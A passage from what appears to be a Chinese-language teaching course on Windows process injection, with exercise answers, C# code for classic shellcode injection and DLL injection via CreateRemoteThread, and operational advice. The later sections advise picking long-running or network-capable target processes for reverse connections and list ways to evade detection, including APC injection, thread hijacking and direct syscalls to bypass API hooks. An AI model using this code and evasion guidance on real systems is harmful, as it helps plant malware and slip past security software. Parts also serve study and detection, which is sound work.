### 代码分析题答案

**题目 1**：
1. 功能：经典进程注入，将 shellcode 注入到目标进程并执行
2. `0x001F0FFF` = PROCESS_ALL_ACCESS，请求所有访问权限
3. `0x3000` = MEM_COMMIT | MEM_RESERVE，`0x40` = PAGE_EXECUTE_READWRITE
4. 检测特征：跨进程内存分配、跨进程内存写入、远程线程创建

**题目 2**：
1. C 字符串需要 null 终止符
2. DLL 路径只需要可读写 (0x04 = PAGE_READWRITE)，不需要执行权限
3. `remoteAddr` 是 DLL 路径的地址，作为 LoadLibraryA 的参数
4. 经典注入直接执行 shellcode，DLL 注入通过 LoadLibrary 加载 DLL

## 六、代码汇总

### 6.1 经典进程注入 (C#)

```csharp
// API 声明
[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

// 常量
const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
const uint MEM_COMMIT = 0x1000;
const uint MEM_RESERVE = 0x2000;
const uint PAGE_EXECUTE_READWRITE = 0x40;

// 注入流程
IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
IntPtr remoteAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, remoteAddr, shellcode, (uint)shellcode.Length, out bytesWritten);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out threadId);
```

### 6.2 DLL 注入 (C#)

```csharp
// 写入 DLL 路径
byte[] dllPathBytes = Encoding.ASCII.GetBytes(dllPath + "\0");
IntPtr remoteAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, 0x3000, 0x04);
WriteProcessMemory(hProcess, remoteAddr, dllPathBytes, (uint)dllPathBytes.Length, out bytesWritten);

// 获取 LoadLibraryA 地址
IntPtr kernel32 = GetModuleHandle("kernel32.dll");
IntPtr loadLibraryAddr = GetProcAddress(kernel32, "LoadLibraryA");

// 创建远程线程
CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, remoteAddr, 0, out threadId);
```

## 七、实战经验总结

### 7.1 选择目标进程的原则

```
好的目标进程特征:
1. 长期运行的进程 (如 explorer.exe, svchost.exe)
2. 有网络权限的进程 (便于建立反向连接)
3. 不会被用户关闭的进程
4. 与恶意行为相符的进程 (如注入到浏览器进行网络操作)

避免的目标:
1. 关键系统进程 (可能导致系统不稳定)
2. 受保护的进程 (如 csrss.exe)
3. 短期运行的进程
```

### 7.2 常见问题排查

| 问题 | 可能原因 | 解决方案 |
|------|----------|----------|
| OpenProcess 失败 | 权限不足 | 提升权限或选择其他进程 |
| VirtualAllocEx 失败 | 内存不足或权限问题 | 检查目标进程状态 |
| WriteProcessMemory 失败 | 地址无效 | 确认 VirtualAllocEx 成功 |
| CreateRemoteThread 失败 | 安全软件拦截 | 使用其他注入方式 |
| 注入后崩溃 | 架构不匹配 | 确认 32/64 位一致 |

### 7.3 检测规避建议

1. **避免使用 CreateRemoteThread**：使用 APC 注入或线程劫持
2. **分散操作**：不要连续调用所有 API
3. **使用 syscall**：直接调用系统调用绕过 API hook
4. **选择合适的目标**：注入到与行为相符的进程
